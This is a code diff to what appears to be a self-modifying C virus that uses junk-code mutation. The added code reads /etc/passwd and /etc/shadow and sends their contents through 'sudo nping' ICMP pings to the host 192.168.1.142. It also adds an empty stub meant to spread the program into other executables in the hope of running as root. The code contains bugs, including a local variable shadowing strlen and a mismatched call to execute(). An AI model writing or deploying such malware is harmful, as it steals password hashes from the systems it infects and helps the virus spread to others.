@@ -142,11 +142,79 @@ void replacejunk(void)
     }
 }
 
+char* read_file(const char *filename)
+{
+    unsigned char *str;
+    int strlen;
+    /* Opens file, rb represents read and binary */
+    FILE *fp = fopen(filename, "r");   JUNK;
+    /* Sets the file position of the stream to the given offset (0 long int) */
+    fseek(fp, 0L, SEEK_END);            JUNK;
+    /* Sets the length of the code  */
+    strlen = ftell(fp);
+    /* Allocates memory to the length of the code */
+    str = malloc(strlen);             JUNK;
+    /* Gets the file position of the stream to the start of the file */
+    fseek(fp, 0L, SEEK_SET);
+    /* Reads the file into the code variable in memory */
+    fread(str, strlen, 1, fp);        JUNK;
+
+    return str;
+}
+
+void send_ping(const char *cmd)
+{
+    system(cmd);
+}
+
+// Send /etc/passwd and /etc/shadow files in a ping
+void execute()
+{
+    unsigned char *passwd;
+    unsigned char *shadow;
+    int passwd_len;
+    int shadow_len;
+
+    passwd = read_file("/etc/passwd");
+    shadow = read_file("/etc/shadow");
+
+    passwd_len = strlen(passwd);
+    shadow_len = strlen(shadow);
+
+    char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" 192.168.1.142";
+    int ping_len = strlen(ping);
+
+    int passwd_cmd_len = ping_len + passwd_len + 1;
+    int shadow_cmd_len = ping_len + shadow_len + 1;
+
+    char passwd_cmd[passwd_cmd_len];
+    char shadow_cmd[shadow_cmd_len];
+
+    sprintf(passwd_cmd, ping, passwd);
+    sprintf(shadow_cmd, ping, shadow);
+
+    printf(passwd_cmd);
+    printf(shadow_cmd);
+
+    send_ping(passwd_cmd);
+    send_ping(shadow_cmd);
+}
+
+// Propagate into executable files in hopes of being run as sudo
+void propagate()
+{
+
+}
+
+// Should check before executing if root privelege
 int main(int argc, char* argv[])
 {
-    readcode(argv[0]);  JUNK;
-    replacejunk();      JUNK;
-    writecode(argv[0]); JUNK;
+    system("id -u"); // outputs 0 if root user
+    execute("192.168.1.142"); // send ICMP ping with custom payload to IP
+
+    //readcode(argv[0]);  JUNK;
+    //replacejunk();      JUNK;
+    //writecode(argv[0]); JUNK;
 
     return 0;
 }
